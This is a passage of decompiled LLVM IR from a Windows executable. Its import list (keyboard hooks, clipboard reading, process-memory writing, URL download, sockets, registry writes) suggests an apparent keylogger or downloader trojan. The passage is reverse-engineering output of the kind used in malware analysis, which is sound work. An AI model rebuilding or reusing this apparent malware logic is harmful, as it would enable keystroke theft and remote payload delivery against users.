  %108 = trunc i32 %storemerge8.reload to i8, !insn.addr !2168
  %109 = add i8 %107, %108, !insn.addr !2168
  store i8 %109, i8* %106, align 1, !insn.addr !2168
  ret i32 %storemerge8.reload, !insn.addr !2168

dec_label_pc_407a1e:                              ; preds = %dec_label_pc_4079aa
  %110 = call i32 @__readfsdword(i32 %storemerge8.reload), !insn.addr !2169
  store i32 %110, i32* %stack_var_-8, align 4, !insn.addr !2169
  %111 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !2169
  call void @__writefsdword(i32 %storemerge8.reload, i32 %111), !insn.addr !2170
  ret i32 %storemerge8.reload, !insn.addr !2170
}

define i32 @function_407a48() local_unnamed_addr {
dec_label_pc_407a48:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2171
  %2 = add i32 %1, -1, !insn.addr !2171
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2171
  ret i32 %0, !insn.addr !2172
}

define i32 @function_407a50() local_unnamed_addr {
dec_label_pc_407a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2173
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a7b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2174
  ret i32 %0, !insn.addr !2174
}

define i32 @function_407a80() local_unnamed_addr {
dec_label_pc_407a80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2175
}

define i32 @function_407a82(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2176
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b7c:
  ret i32 0, !insn.addr !2177
}

define i32 @function_407ebe() local_unnamed_addr {
dec_label_pc_407ebe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_407b97() local_unnamed_addr {
dec_label_pc_407b97:
  %esp.1.reg2mem = alloca i32, !insn.addr !2178
  %esp.0.reg2mem = alloca i32, !insn.addr !2178
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca %_SECURITY_ATTRIBUTES*, align 4
  %stack_var_-60 = alloca %_SECURITY_ATTRIBUTES*, align 4
  %stack_var_-48 = alloca %_SECURITY_ATTRIBUTES*, align 4
  %stack_var_-44 = alloca i8*, align 4
  %stack_var_-36 = alloca i32 (i32, i32, i32)*, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(), !insn.addr !2179
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2180
  store i32 %2, i32* %stack_var_-12, align 4, !insn.addr !2180
  %3 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !2180
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2181
  store i32 0, i32* %stack_var_-24, align 4, !insn.addr !2182
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 262 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 0), !insn.addr !2183
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2184
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2184
  store i8 0, i8* %6, align 1, !insn.addr !2184
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2185
  %8 = call i32 @function_407008(), !insn.addr !2186
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2187
  %10 = call i32 @function_407080(), !insn.addr !2188
  %11 = trunc i32 %10 to i8, !insn.addr !2189
  %12 = icmp eq i8 %11, 0, !insn.addr !2189
  br i1 %12, label %dec_label_pc_407c83, label %dec_label_pc_407c08, !insn.addr !2190

dec_label_pc_407c08:                              ; preds = %dec_label_pc_407b97
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2191
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2192
  store i32 -1, i32* %14, align 4, !insn.addr !2192
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2193
  %16 = call i32 @function_407048(), !insn.addr !2194
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2195
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2196
  %19 = call i32 @function_4036c8(), !insn.addr !2197
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2198
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2199
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2200
  %23 = call i32 @function_407ebe(), !insn.addr !2201
  ret i32 %23, !insn.addr !2201

dec_label_pc_407c83:                              ; preds = %dec_label_pc_407b97
  %24 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !2182
  %25 = call i32 @function_4060f0(), !insn.addr !2202
  %26 = call i32 @function_407080(), !insn.addr !2203
  %27 = trunc i32 %26 to i8, !insn.addr !2204
  %28 = icmp eq i8 %27, 0, !insn.addr !2204
  store i32 %24, i32* %esp.1.reg2mem, !insn.addr !2205
  br i1 %28, label %dec_label_pc_407df2, label %dec_label_pc_407ca5, !insn.addr !2205

dec_label_pc_407ca5:                              ; preds = %dec_label_pc_407c83
  %29 = load i32, i32* @global_var_408138, align 4, !insn.addr !2206
  %30 = inttoptr i32 %29 to i32*, !insn.addr !2207
  store i32 -1, i32* %30, align 4, !insn.addr !2207
  %31 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %32 = ptrtoint i32 (i32, i32, i32)* %31 to i32
  %33 = bitcast i32 (i32, i32, i32)** %stack_var_-36 to i32*
  store i32 %32, i32* %33, align 4
  %34 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 %32), !insn.addr !2208
  %35 = add i32 %34, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2209
  %36 = inttoptr i32 %35 to i8*, !insn.addr !2209
  store i8 0, i8* %36, align 1, !insn.addr !2209
  %37 = call i32 @"@LStrFromArray"(), !insn.addr !2210
  %38 = call i32 @function_407048(), !insn.addr !2211
  %39 = call i32 @"@LStrAsg"(), !insn.addr !2212
  %40 = call i32 @"@LStrCat3"(), !insn.addr !2213
  %41 = load i32, i32* @global_var_408138, align 4, !insn.addr !2214
  %42 = icmp eq i32 %41, 0, !insn.addr !2214
  br i1 %42, label %dec_label_pc_407d49, label %dec_label_pc_407d16, !insn.addr !2215

dec_label_pc_407d16:                              ; preds = %dec_label_pc_407ca5
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_407e84, i32 0, i32 0), i8** %stack_var_-44, align 4, !insn.addr !2216
  %43 = ptrtoint i8** %stack_var_-44 to i32, !insn.addr !2216
  %44 = call i32* @FindWindowA(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_407e74, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_407e84, i32 0, i32 0)), !insn.addr !2217
  %45 = icmp eq i32* %44, null, !insn.addr !2218
  %46 = icmp eq i1 %45, false, !insn.addr !2219
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2219
  br i1 %46, label %dec_label_pc_407df2, label %dec_label_pc_407d2d, !insn.addr !2219

dec_label_pc_407d2d:                              ; preds = %dec_label_pc_407d16
  store %_SECURITY_ATTRIBUTES* bitcast (i32* @global_var_409808 to %_SECURITY_ATTRIBUTES*), %_SECURITY_ATTRIBUTES** %stack_var_-48, align 4, !insn.addr !2220
  store %_SECURITY_ATTRIBUTES* inttoptr (i32 4220648 to %_SECURITY_ATTRIBUTES*), %_SECURITY_ATTRIBUTES** %stack_var_-60, align 4, !insn.addr !2221
  store %_SECURITY_ATTRIBUTES* null, %_SECURITY_ATTRIBUTES** %stack_var_-68, align 4, !insn.addr !2222
  %47 = ptrtoint %_SECURITY_ATTRIBUTES** %stack_var_-68 to i32, !insn.addr !2222
  %48 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @global_var_409808 to %_SECURITY_ATTRIBUTES*), i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220648 to i32*), i32 0, i32* null), !insn.addr !2223
  store i32 %47, i32* %esp.1.reg2mem, !insn.addr !2224
  br label %dec_label_pc_407df2, !insn.addr !2224

dec_label_pc_407d49:                              ; preds = %dec_label_pc_407ca5
  %49 = ptrtoint i32 (i32, i32, i32)** %stack_var_-36 to i32, !insn.addr !2225
  %50 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2226
  %51 = icmp eq i32 %50, 0, !insn.addr !2226
  store i32 %49, i32* %esp.1.reg2mem, !insn.addr !2227
  br i1 %51, label %dec_label_pc_407df2, label %dec_label_pc_407d57, !insn.addr !2227

dec_label_pc_407d57:                              ; preds = %dec_label_pc_407d49
  %52 = load i32, i32* @global_var_408148, align 4, !insn.addr !2228
  %53 = icmp slt i32 %52, 1, !insn.addr !2229
  br i1 %53, label %dec_label_pc_407da3, label %dec_label_pc_407d70, !insn.addr !2229

dec_label_pc_407d70:                              ; preds = %dec_label_pc_407d57
  %54 = call i32 @function_404d38(), !insn.addr !2230
  %55 = call i32 @"@LStrCmp"(), !insn.addr !2231
  %56 = load i32, i32* @global_var_408154, align 4, !insn.addr !2232
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2233
  store i32 -1, i32* %57, align 4, !insn.addr !2233
  br label %dec_label_pc_407da3

dec_label_pc_407da3:                              ; preds = %dec_label_pc_407d70, %dec_label_pc_407d57
  store i8* inttoptr (i32 16065 to i8*), i8** %stack_var_-44, align 4, !insn.addr !2234
  %58 = load %_SECURITY_ATTRIBUTES*, %_SECURITY_ATTRIBUTES** @global_var_408118, align 4
  %59 = ptrtoint %_SECURITY_ATTRIBUTES* %58 to i32
  %60 = bitcast %_SECURITY_ATTRIBUTES** %stack_var_-48 to i32*
  store i32 %59, i32* %60, align 4
  %61 = ptrtoint %_SECURITY_ATTRIBUTES** %stack_var_-48 to i32, !insn.addr !2235
  %62 = bitcast %_SECURITY_ATTRIBUTES* %58 to i8*
  %63 = call i32* @FindResourceA(i32* inttoptr (i32 3 to i32*), i8* inttoptr (i32 16065 to i8*), i8* %62), !insn.addr !2236
  %64 = icmp eq i32* %63, null, !insn.addr !2237
  %65 = icmp eq i1 %64, false, !insn.addr !2238
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !2238
  br i1 %65, label %dec_label_pc_407de3, label %dec_label_pc_407db9, !insn.addr !2238

dec_label_pc_407db9:                              ; preds = %dec_label_pc_407da3
  %66 = load %_SECURITY_ATTRIBUTES*, %_SECURITY_ATTRIBUTES** @global_var_408118, align 4
  %67 = ptrtoint %_SECURITY_ATTRIBUTES* %66 to i32
  %68 = bitcast %_SECURITY_ATTRIBUTES** %stack_var_-60 to i32*
  store i32 %67, i32* %68, align 4
  %69 = ptrtoint %_SECURITY_ATTRIBUTES** %stack_var_-60 to i32, !insn.addr !2239
  %70 = bitcast %_SECURITY_ATTRIBUTES* %66 to i8*
  %71 = call i32* @FindResourceA(i32* inttoptr (i32 14 to i32*), i8* inttoptr (i32 16065 to i8*), i8* %70), !insn.addr !2240
  %72 = icmp eq i32* %71, null, !insn.addr !2241
  %73 = icmp eq i1 %72, false, !insn.addr !2242
  store i32 %69, i32* %esp.0.reg2mem, !insn.addr !2242
  br i1 %73, label %dec_label_pc_407de3, label %dec_label_pc_407dcf, !insn.addr !2242

dec_label_pc_407dcf:                              ; preds = %dec_label_pc_407db9
  %74 = load %_SECURITY_ATTRIBUTES*, %_SECURITY_ATTRIBUTES** @global_var_408118, align 4
  %75 = ptrtoint %_SECURITY_ATTRIBUTES* %74 to i32
  %76 = bitcast %_SECURITY_ATTRIBUTES** %stack_var_-68 to i32*
  store i32 %75, i32* %76, align 4
  %77 = ptrtoint %_SECURITY_ATTRIBUTES** %stack_var_-68 to i32, !insn.addr !2243
  %78 = bitcast %_SECURITY_ATTRIBUTES* %74 to i8*
  %79 = call i32* @LoadIconA(i32* inttoptr (i32 16065 to i32*), i8* %78), !insn.addr !2244
  %80 = icmp eq i32* %79, null, !insn.addr !2245
  store i32 %77, i32* %esp.0.reg2mem, !insn.addr !2246
  store i32 %77, i32* %esp.1.reg2mem, !insn.addr !2246
  br i1 %80, label %dec_label_pc_407df2, label %dec_label_pc_407de3, !insn.addr !2246

dec_label_pc_407de3:                              ; preds = %dec_label_pc_407dcf, %dec_label_pc_407db9, %dec_label_pc_407da3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  store i32 4225616, i32* @global_var_409654, align 4, !insn.addr !2247
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !2247
  br label %dec_label_pc_407df2, !insn.addr !2247

dec_label_pc_407df2:                              ; preds = %dec_label_pc_407de3, %dec_label_pc_407dcf, %dec_label_pc_407d49, %dec_label_pc_407d2d, %dec_label_pc_407d16, %dec_label_pc_407c83
  %81 = add i32 %0, -76, !insn.addr !2178
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2178
  %83 = add i32 %0, -64, !insn.addr !2248
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2248
  %85 = add i32 %0, -68, !insn.addr !2249
  %86 = inttoptr i32 %85 to i32*, !insn.addr !2249
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %87 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2250
  %88 = load i32, i32* %87, align 4, !insn.addr !2250
  call void @__writefsdword(i32 0, i32 %88), !insn.addr !2251
  %89 = add i32 %esp.1.reload, 8, !insn.addr !2252
  %90 = inttoptr i32 %89 to i32*, !insn.addr !2252
  store i32 4226580, i32* %90, align 4, !insn.addr !2252
  %91 = call i32 @"@LStrArrayClr"(), !insn.addr !2253
  ret i32 %91, !insn.addr !2254
}

define i32 @function_407e0d() local_unnamed_addr {
dec_label_pc_407e0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2255
  ret i32 %0, !insn.addr !2255
}

define i32 @function_407e12() local_unnamed_addr {
dec_label_pc_407e12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2256
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_out(i32, i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
!73 = !{i64 4207815}
!74 = !{i64 4207816}
!75 = !{i64 4207818}
!76 = !{i64 4207820}
!77 = !{i64 4207823}
!78 = !{i64 4208007}
!79 = !{i64 4208145}
!80 = !{i64 4208312}
!81 = !{i64 4208314}
!82 = !{i64 4208316}
!83 = !{i64 4208319}
!84 = !{i64 4208320}
!85 = !{i64 4208322}
!86 = !{i64 4208326}
!87 = !{i64 4208328}
!88 = !{i64 4208332}
!89 = !{i64 4208408}
!90 = !{i64 4208413}
!91 = !{i64 4208416}
!92 = !{i64 4208421}
!93 = !{i64 4208487}
!94 = !{i64 4208831}
!95 = !{i64 4209003}
!96 = !{i64 4209263}
!97 = !{i64 4209790}
!98 = !{i64 4209799}
!99 = !{i64 4209800}
!100 = !{i64 4209802}
!101 = !{i64 4209804}
!102 = !{i64 4209807}
!103 = !{i64 4209808}
!104 = !{i64 4209813}
!105 = !{i64 4209814}
!106 = !{i64 4209832}
!107 = !{i64 4209837}
!108 = !{i64 4209840}
!109 = !{i64 4209845}
!110 = !{i64 4210564}
!111 = !{i64 4210569}
!112 = !{i64 4210573}
!113 = !{i64 4210746}
!114 = !{i64 4210751}
!115 = !{i64 4210759}
!116 = !{i64 4210834}
!117 = !{i64 4210839}
!118 = !{i64 4210842}
!119 = !{i64 4211056}
!120 = !{i64 4211064}
!121 = !{i64 4211072}
!122 = !{i64 4211080}
!123 = !{i64 4211088}
!124 = !{i64 4211096}
!125 = !{i64 4211121}
!126 = !{i64 4211381}
!127 = !{i64 4211386}
!128 = !{i64 4211471}
!129 = !{i64 4211474}
!130 = !{i64 4211477}
!131 = !{i64 4211485}
!132 = !{i64 4211488}
!133 = !{i64 4211496}
!134 = !{i64 4211497}
!135 = !{i64 4211502}
!136 = !{i64 4211505}
!137 = !{i64 4211508}
!138 = !{i64 4211515}
!139 = !{i64 4211527}
!140 = !{i64 4211530}
!141 = !{i64 4211533}
!142 = !{i64 4211541}
!143 = !{i64 4211544}
!144 = !{i64 4211552}
!145 = !{i64 4211553}
!146 = !{i64 4211558}
!147 = !{i64 4211561}
!148 = !{i64 4211564}
!149 = !{i64 4211571}
!150 = !{i64 4211572}
!151 = !{i64 4211580}
!152 = !{i64 4211588}
!153 = !{i64 4211596}
!154 = !{i64 4211604}
!155 = !{i64 4211612}
!156 = !{i64 4211620}
!157 = !{i64 4211628}
!158 = !{i64 4211636}
!159 = !{i64 4211644}
!160 = !{i64 4211652}
!161 = !{i64 4211660}
!162 = !{i64 4211668}
!163 = !{i64 4211676}
!164 = !{i64 4211684}
!165 = !{i64 4211692}
!166 = !{i64 4211700}
!167 = !{i64 4211708}
!168 = !{i64 4211716}
!169 = !{i64 4211724}
!170 = !{i64 4211732}
!171 = !{i64 4211740}
!172 = !{i64 4211748}
!173 = !{i64 4211756}
!174 = !{i64 4211764}
!175 = !{i64 4211772}
!176 = !{i64 4211780}
!177 = !{i64 4211788}
!178 = !{i64 4211796}
!179 = !{i64 4211804}
!180 = !{i64 4211812}
!181 = !{i64 4211820}
!182 = !{i64 4211828}
!183 = !{i64 4211836}
!184 = !{i64 4211844}
!185 = !{i64 4211852}
!186 = !{i64 4211860}
!187 = !{i64 4211868}
!188 = !{i64 4211876}
!189 = !{i64 4211884}
!190 = !{i64 4211892}
!191 = !{i64 4211900}
!192 = !{i64 4211908}
!193 = !{i64 4211916}
!194 = !{i64 4211924}
!195 = !{i64 4211932}
!196 = !{i64 4211940}
!197 = !{i64 4211948}
!198 = !{i64 4211956}
!199 = !{i64 4211964}
!200 = !{i64 4211972}
!201 = !{i64 4211980}
!202 = !{i64 4211988}
!203 = !{i64 4211996}
!204 = !{i64 4212004}
!205 = !{i64 4212012}
!206 = !{i64 4212020}
!207 = !{i64 4212028}
!208 = !{i64 4212036}
!209 = !{i64 4212044}
!210 = !{i64 4212052}
!211 = !{i64 4212060}
!212 = !{i64 4212068}
!213 = !{i64 4212076}
!214 = !{i64 4212084}
!215 = !{i64 4212092}
!216 = !{i64 4212100}
!217 = !{i64 4212108}
!218 = !{i64 4212116}
!219 = !{i64 4212124}
!220 = !{i64 4212132}
!221 = !{i64 4212141}
!222 = !{i64 4212146}
!223 = !{i64 4212148}
!224 = !{i64 4212255}
!225 = !{i64 4212258}
!226 = !{i64 4212261}
!227 = !{i64 4212269}
!228 = !{i64 4212272}
!229 = !{i64 4212280}
!230 = !{i64 4212281}
!231 = !{i64 4212286}
